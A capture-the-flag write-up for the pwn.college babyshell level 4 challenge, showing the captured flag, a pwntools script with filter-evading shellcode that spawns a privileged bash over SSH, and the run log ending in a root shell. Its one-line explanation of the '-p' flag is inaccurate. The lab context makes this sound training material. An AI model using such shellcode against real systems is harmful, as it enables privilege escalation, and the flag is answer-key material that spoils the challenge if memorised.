
Flag - ```pwn.college{4tVI7uEqd_QbDe23QYDVBwI2TBl.0FMyIDLxEzN0czW}```

Code to bypass the filters by launching a new shell (`/bin/sh`) with the `-p` option to prevent the shell from setting up certain variables that would normally be set, particularly the IFS (Internal Field Separator) and PATH variables.

```python
from pwn import *

context.arch='amd64'
context.os='linux'

code=asm('''
    push 0x68
push 0x6e69622f
mov dword ptr [rsp+4], 0x7361622f
push rsp
pop rdi
push 0x702d
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
''')
file="/challenge/babyshell-level-4"
host='pwn.college'
username='hacker'
keypath = '~/key'

ssh_connection = ssh(user=username, host=host, keyfile=keypath)

process=ssh_connection.process(file)

process.recvuntil("Reading 0x1000 bytes from stdin.")
process.sendline(code)
process.interactive()
ssh_connection.close()
```

Spawns a shell where cat /flag can be used.

```
(base) fiendfyre@fedora:~/Documents/CTFdump$ python3 temp3.py
[+] Connecting to pwn.college on port 22: Done
[*] hacker@pwn.college:
    Distro    Ubuntu 20.04
    OS:       linux
    Arch:     amd64
    Version:  6.8.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on pwn.college: pid 189
[!] ASLR is disabled for '/challenge/babyshell-level-4'!
/home/fiendfyre/Documents/CTFdump/temp3.py:35: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  process.recvuntil("Reading 0x1000 bytes from stdin.")
[*] Switching to interactive mode


Executing filter...

This challenge requires that your shellcode have no H bytes!

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x000000002588d000 | 6a 68                                         | push 0x68
0x000000002588d002 | 68 2f 62 69 6e                                | push 0x6e69622f
0x000000002588d007 | c7 44 24 04 2f 62 61 73                       | mov dword ptr [rsp + 4], 0x7361622f
0x000000002588d00f | 54                                            | push rsp
0x000000002588d010 | 5f                                            | pop rdi
0x000000002588d011 | 68 2d 70 00 00                                | push 0x702d
0x000000002588d016 | 54                                            | push rsp
0x000000002588d017 | 5e                                            | pop rsi
0x000000002588d018 | 6a 00                                         | push 0
0x000000002588d01a | 56                                            | push rsi
0x000000002588d01b | 57                                            | push rdi
0x000000002588d01c | 54                                            | push rsp
0x000000002588d01d | 5e                                            | pop rsi
0x000000002588d01e | 6a 00                                         | push 0
0x000000002588d020 | 5a                                            | pop rdx
0x000000002588d021 | 6a 3b                                         | push 0x3b
0x000000002588d023 | 58                                            | pop rax
0x000000002588d024 | 0f 05                                         | syscall 

Executing shellcode!

bash-5.0# $ cat /flag
pwn.college{4tVI7uEqd_QbDe23QYDVBwI2TBl.0FMyIDLxEzN0czW}
```